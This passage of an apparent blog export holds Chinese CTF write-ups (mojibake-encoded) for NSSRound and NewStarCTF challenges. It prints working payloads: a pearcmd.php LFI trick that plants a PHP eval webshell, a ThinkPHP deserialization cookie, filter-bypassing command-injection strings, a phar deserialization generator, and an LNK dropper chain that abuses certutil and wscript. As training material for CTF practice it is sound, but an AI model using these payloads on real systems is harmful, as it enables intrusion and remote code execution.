<span class="string">&quot;http://43.142.108.3:28187/download&quot;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;test2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=params).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 5</title>
      <link href="/2023/05/31/NSSRound5/"/>
      <url>/2023/05/31/NSSRound5/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>æ€è·¯ä¸€ï¼Œç”¨&#x2F;flagè¦†ç›–app.pyæ–‡ä»¶ï¼Œå†è®¿é—®&#x2F;sourceè·¯ç”±</p><p>è¿™é‡Œè¦†ç›–å®Œäº†ä¹‹åï¼Œè¿˜å¯ä»¥è®¿é—®è·¯ç”±çš„åŸå› æ˜¯<code>debug=False</code>ï¼Œæ‰€ä»¥å³ä½¿è¦†ç›–äº†app.pyæ–‡ä»¶ï¼Œä½†æ˜¯flaskè¿è¡Œæ‰€ä½¿ç”¨çš„æ–‡ä»¶å¹¶æ²¡æœ‰å—åˆ°å½±å“ã€‚</p><p>è€Œå¦‚æœ<code>debug=True</code>ï¼Œå½“æˆ‘ä»¬ä¿®æ”¹æ–‡ä»¶æ—¶ï¼Œflaskå°±ä¼šè‡ªåŠ¨é‡è½½æ–‡ä»¶ã€‚</p><p>æ­¤æ—¶è¦†ç›–flaskè¿è¡Œæ–‡ä»¶ï¼ˆæˆ‘æœ¬åœ°æ˜¯pyrce.pyï¼‰</p><p>æ§åˆ¶å°</p><p><img src="/../images/image-20221022132313611-1686150585118.png" alt="image-20221022132313611"></p><p>è®¿é—®&#x2F;sourceè·¯ç”±</p><p><img src="/../images/image-20221022132349822-1686150585118.png" alt="image-20221022132349822"></p><p>æ€è·¯äºŒï¼Œåˆ©ç”¨å¯ä»¥è®¿é—®é™æ€æ–‡ä»¶ï¼Œå…ˆåˆ›å»ºstaticç›®å½•ï¼ˆflaskæ¡†æ¶ç»“æ„ï¼Œé™æ€æ–‡ä»¶æ”¾åœ¨staticç›®å½•ä¸‹ï¼‰ï¼Œå†å°†flagå¤åˆ¶åˆ°staticç›®å½•ï¼Œè®¿é—®&#x2F;static&#x2F;flagå°±èƒ½å¤Ÿä¸‹è½½flagæ–‡ä»¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF</title>
      <link href="/2023/05/31/NewstarCTF/"/>
      <url>/2023/05/31/NewstarCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="æœ€åçš„æµé‡åˆ†æ"><a href="#æœ€åçš„æµé‡åˆ†æ" class="headerlink" title="æœ€åçš„æµé‡åˆ†æ"></a>æœ€åçš„æµé‡åˆ†æ</h3><p>å…ˆæŒ‰ç…§æ•°æ®åŒ…å¤§å°æ’åˆ—ï¼Œçœ‹äº†å‡ ä¸ªåŒ…å‘ç°æ˜¯sqlå¸ƒå°”ç›²æ³¨ï¼ˆä¸Šå‘¨çš„sqlæˆ‘ç”¨çš„å°±æ˜¯å¸ƒå°”ç›²æ³¨ï¼‰ã€‚</p><p><img src="/../images/image-20221020130300434-1686150281425.png" alt="image-20221020130300434"></p><p>ä¸Šå›¾ä¸ºæ­£ç¡®å›æ˜¾</p><p>è¿›è¡Œè¿‡æ»¤</p><p><img src="/../images/image-20221020130340038-1686150281425.png" alt="image-20221020130340038"></p><p>ä¸€ä¸ªä¸€ä¸ªæ‰¾å°±è¡Œäº†</p><h3 id="å¥‡æ€ªçš„PDF-2"><a href="#å¥‡æ€ªçš„PDF-2" class="headerlink" title="å¥‡æ€ªçš„PDF 2"></a>å¥‡æ€ªçš„PDF 2</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œæ‰“å¼€æ˜¯ã€Šæ¬ºéª—çš„è‰ºæœ¯ã€‹è¿™æœ¬ä¹¦ã€‚ğŸ˜±</p><p>å®ƒæ˜¯å¿«æ·æ–¹å¼ï¼Œå¾ˆè‡ªç„¶å°±å»çœ‹å®ƒæŒ‡å‘äº†å“ªä¸ªæ–‡ä»¶</p><p><img src="/../images/image-20221020130709420-1686150281425.png" alt="image-20221020130709420"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">SystemRoot%\system32\cmd.exe /c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y</span></span><br><span class="line"></span><br><span class="line">for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y</span><br><span class="line"></span><br><span class="line">findstr.exe&quot;TVNDRgAAAA&quot;%tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.ex</span><br></pre></td></tr></table></figure><p>ç„¶åæœç´¢msoia.exeå°±å¾—åˆ°äº†ç±»ä¼¼çš„é¢˜</p><p><a href="https://www.anquanke.com/post/id/267031">https://www.anquanke.com/post/id/267031</a></p><p><a href="https://www.cnblogs.com/hed10ne/p/15841253.html">https://www.cnblogs.com/hed10ne/p/15841253.html</a></p><blockquote><p>ç›®æ ‡çš„æœ€å¤§é•¿åº¦åªæœ‰260ä¸ªå­—ç¬¦ï¼Œè€Œå‘½ä»¤è¡Œå‚æ•°çš„æœ€å¤§é•¿åº¦æ˜¯4096ä¸ªå­—ç¬¦</p></blockquote><p>è¯»å–å®Œæ•´å‘½ä»¤</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> win32com.client <span class="comment"># pip install pywin32</span></span><br><span class="line"></span><br><span class="line">shell = win32com.client.Dispatch(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">shortcut = shell.CreateShortCut(<span class="string">&quot;20200308-sitrep-48-covid-19.pdf.lnk&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Targetpath)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Arguments)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS D:\python3<span class="number">.8</span>\code&gt; python -u <span class="string">&quot;d:\python3.8\code\0.py&quot;</span></span><br><span class="line">C:\Windows\System32\cmd.exe</span><br><span class="line">/c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y&amp;<span class="keyword">for</span> /r C:\\Windows\\System32\\ %i <span class="keyword">in</span> (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&amp;findstr.exe <span class="string">&quot;TVNDRgAAAA&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&amp;expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp% &amp;wscript %tmp%\\9sOXN6Ltf0afe7.js</span><br></pre></td></tr></table></figure><p><code>oGhPGUDC03tURV.tmp</code>çš„æ–‡ä»¶å¤´æ˜¯MSCFï¼Œæ˜¯å¾®è½¯çš„.cabå‹ç¼©æ–‡ä»¶æ ¼å¼</p><p><img src="/../images/image-20221020131408248-1686150281425.png" alt="image-20221020131408248"></p><p>ä½¿ç”¨å‘½ä»¤<code>expand %tmp%\\oGhPGUDC03tURV.tmp -F:* è§£å‹è·¯å¾„</code>å¾—åˆ°</p><p><img src="/../images/image-20221020131537014-1686150281425.png" alt="image-20221020131537014"></p><p>flagåœ¨flag.txtä¸­</p><p>jsè„šæœ¬</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> e7926b8de13327f8e703624e = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);e7926b8de13327f8e703624e.<span class="property">Run</span> (<span class="string">&quot;cmd /c mkdir %tmp%\\flag&amp;&amp;move /Y %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\flag\\flag.txt&amp;\&quot;%tmp%\\strange2.pdf\&quot;&quot;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="Yesec-no-drumsticks-5"><a href="#Yesec-no-drumsticks-5" class="headerlink" title="Yesec no drumsticks 5"></a>Yesec no drumsticks 5</h3><h4 id="gitå·¥ä½œåŸç†"><a href="#gitå·¥ä½œåŸç†" class="headerlink" title="gitå·¥ä½œåŸç†"></a>gitå·¥ä½œåŸç†</h4><img src="E:\typora img\git-command.jpg" alt="img" style="zoom:150%;" /><ul><li>workspaceï¼šå·¥ä½œåŒºâ€“æœ¬åœ°ç›®å½•ï¼ˆæ¯”å¦‚æˆ‘<code>git init Test</code>åˆ›å»ºäº†ä¸€ä¸ªç©ºä»“åº“ï¼Œé‚£ä¹ˆ<code>Test</code>è¿™ä¸ªç›®å½•å°±æ˜¯workspaceï¼‰</li><li>staging areaï¼šæš‚å­˜åŒº&#x2F;ç¼“å­˜åŒºâ€“.gitç›®å½•ä¸‹çš„indexæ–‡ä»¶ï¼ˆ<code>git add</code> æˆ–è€…<code>git stash</code>ï¼‰</li><li>local repositoryï¼šç‰ˆæœ¬åº“æˆ–æœ¬åœ°ä»“åº“â€“.gitç›®å½•ä¸‹çš„objectsç›®å½•</li><li>remote repositoryï¼šè¿œç¨‹ä»“åº“â€“github</li></ul><p>ä»¥æœ¬é¢˜ä¸ºä¾‹ï¼Œå…¶<code>.git</code>ç›®å½•å¦‚ä¸‹</p><p><img src="/../images/image-20221020162618015-1686150281425.png" alt="image-20221020162618015"></p><h4 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p><img src="/../images/image-20221020163752820-1686150281425.png" alt="image-20221020163752820"></p><p>indexä¸­æœ‰flag.txtæ–‡ä»¶</p><p>æ¢å¤ç¼“å­˜å·¥ä½œåŒº<code>git stash pop</code></p><p><img src="/../images/image-20221020163917173-1686150281426.png" alt="image-20221020163917173"></p><p>å›æ»š<code>git reset --hard commit_id</code>åï¼Œè¯»å–flag.txtå¾—åˆ°<code>flag&#123;Yesec#1s#c@ibi&#125;</code></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>æºç æ³„éœ²</p><ol><li><p>gitå›æ»š</p><p>æŸ¥çœ‹å†å²ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p>å›æ»šåˆ°å†å²ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure><blockquote><p>å®é™…ä¸Šå°±æ˜¯å°†HEADæŒ‡å‘commit_id</p></blockquote></li><li><p>gitç¼“å­˜</p><p>å°†å½“å‰å·¥ä½œåŒºç¼“å­˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash</span><br></pre></td></tr></table></figure><p>æ¢å¤ç¼“å­˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash pop</span><br></pre></td></tr></table></figure><p>å›æ»šåˆ°ç¼“å­˜ç‰ˆæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure></li></ol><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="ezapi"><a href="#ezapi" class="headerlink" title="ezapi"></a>ezapi</h4><p>graphql</p><p>æ¼æ´ï¼š<a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ</a></p><p>ä½¿ç”¨è¯­æ³•ï¼š<a href="https://blog.csdn.net/weixin_39130261/article/details/118547853">https://blog.csdn.net/weixin_39130261/article/details/118547853</a></p><h3 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h3><h4 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base64|rot13|filter/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰ç»•è¿‡åç¼€åæ·»åŠ ï¼Œä½¿ç”¨pearcmd.phpç»•è¿‡ã€‚</p><p>pç¥çš„æ–‡ç« ï¼š<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p><blockquote><p>peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚(ç±»ä¼¼äºpythonä¸­çš„pip)åœ¨7.3åŠä»¥å‰ï¼Œpecl&#x2F;pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š<code>--with-pear</code>æ‰ä¼šå®‰è£…ã€‚</p><p>ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel&#x2F;pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code></p><p>pearä¸­æœ‰ä¸€ä¸ªå‘½ä»¤config-createï¼Œé˜…è¯»å…¶ä»£ç å’Œå¸®åŠ©ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</p></blockquote><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure><p>ç„¶åä¸€å¥è¯æœ¨é©¬å°±ä¼šè¢«å†™å…¥&#x2F;tmp&#x2F;hello.phpä¸­ï¼Œæˆ‘ä»¬åªéœ€åŒ…å«è¿™ä¸ªæ–‡ä»¶å³å¯ã€‚</p><h4 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h4><p>5.1.41LTS ThinkPHPæ¡†æ¶ååºåˆ—åŒ–æ¼æ´<a href="https://www.freebuf.com/vuls/269882.html">https://www.freebuf.com/vuls/269882.html</a></p><p>è¿™é“é¢˜ååºåˆ—åŒ–ç‚¹åœ¨cookieä¸­</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:</span><br><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&amp;id=whoami</span><br><span class="line">    </span><br><span class="line">?dajs=ls</span><br></pre></td></tr></table></figure><p>flagåœ¨ç¯å¢ƒå˜é‡é‡Œã€‚</p><h3 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h3><h4 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¾ˆå¤šã€‚ä¸»è¦æ˜¯</p><ul><li><p>å…³é”®è¯ç»•è¿‡</p><p>é€šé…ç¬¦ï¼Œæ’å…¥ç©ºå­—ç¬¦ç»•è¿‡ç­‰ç­‰</p></li><li><p>ï¼›ç»•è¿‡</p><p>%0aæˆ–è€…&amp;&amp;ç»•è¿‡</p></li><li><p>&#x2F;ç»•è¿‡</p><p><code>ls /</code> &#x3D;&#x3D; <code>cd è·¯å¾„ï¼›ls</code></p><p>è¿”å›ä¸Šçº§ç›®å½• <code>cd ..</code></p></li><li><p>ç©ºæ ¼ç»•è¿‡</p><p><code>$&#123;IFS&#125;</code>ç­‰ç­‰</p></li></ul><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?cmd=cd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>aca$<span class="number">1</span>t$&#123;IFS&#125;ffff$<span class="number">1</span>llllaaaaggggg</span><br></pre></td></tr></table></figure><h4 id="BabySSTI-Two"><a href="#BabySSTI-Two" class="headerlink" title="BabySSTI_Two"></a>BabySSTI_Two</h4><p>unicodeç¼–ç ç»•è¿‡ï¼Œcatch_warningsè¢«è¿‡æ»¤ï¼Œæ¢ä¸€ä¸ªç±»æ¯”å¦‚os._wrap_closeå°±å¥½äº†ã€‚</p><h4 id="UnserializeThree"><a href="#UnserializeThree" class="headerlink" title="UnserializeThree"></a>UnserializeThree</h4><p>è€ƒç‚¹ï¼špharååºåˆ—åŒ–ï¼Œ#ç»•è¿‡</p><p>æ–‡ä»¶ä¸Šä¼ ç»™å‡ºä¸Šä¼ åæ–‡ä»¶è·¯å¾„</p><p>æ³¨é‡Šä¸­æç¤ºclass.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>#ç»•è¿‡</p><ol><li>é—­åˆphpæ ‡ç­¾</li><li>\n</li><li>\r</li></ol><p>è¿™é‡Œåªèƒ½ç”¨\rã€‚</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;\rsystem(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">                <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">                <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//ç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶åä¸ºtest.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„pharæ”¹å›¾ç‰‡åç¼€åä¸Šä¼ åï¼Œåœ¨class.phpä¸‹ç”¨pharåè®®è®¿é—®ï¼ˆåªè¦æ˜¯pharæ–‡ä»¶ï¼Œåç¼€åæ˜¯ä»€ä¹ˆéƒ½å¯ä»¥è§£æï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">class</span>.php?file=phar:<span class="comment">//file_path</span></span><br></pre></td></tr></table></figure><h4 id="åˆä¸€ä¸ªSQL"><a href="#åˆä¸€ä¸ªSQL" class="headerlink" title="åˆä¸€ä¸ªSQL"></a>åˆä¸€ä¸ªSQL</h4><p>0^0å’Œ0^1ï¼Œå›æ˜¾ä¸¤ç§æƒ…å†µï¼ŒçŒœæµ‹ä½¿ç”¨ç›²æ³¨ã€‚</p><p>payload</p><figure class="highlight 